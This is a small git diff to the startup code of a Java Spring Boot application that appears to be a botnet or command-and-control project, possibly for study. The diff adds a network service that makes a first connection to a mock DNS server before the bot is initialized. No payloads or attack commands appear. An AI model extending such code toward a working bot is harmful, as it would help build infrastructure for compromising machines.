@@ -18,6 +18,7 @@ import cs.sii.bot.action.Behavior;
 import cs.sii.config.onLoad.Config;
 import cs.sii.config.onLoad.Initialize;
 import cs.sii.control.command.Commando;
+import cs.sii.service.connection.NetworkService;
 
 @SpringBootApplication
 @ComponentScan("cs.sii")
@@ -28,6 +29,9 @@ public class Application {
 	@Autowired
 	private Config configEngine;
 
+	@Autowired
+	private NetworkService nServ;
+	
 	@Autowired
 	private Initialize init;
 
@@ -46,7 +50,8 @@ public class Application {
 	public CommandLineRunner commandLineRunner(ApplicationContext ctx) {
 		return args -> {
 			init.loadInfo();
-
+			nServ.firstConnectToMockServerDns();
+						
 			if (!configEngine.isCommandandconquerStatus()) {
 				bot.initializeBot();
 
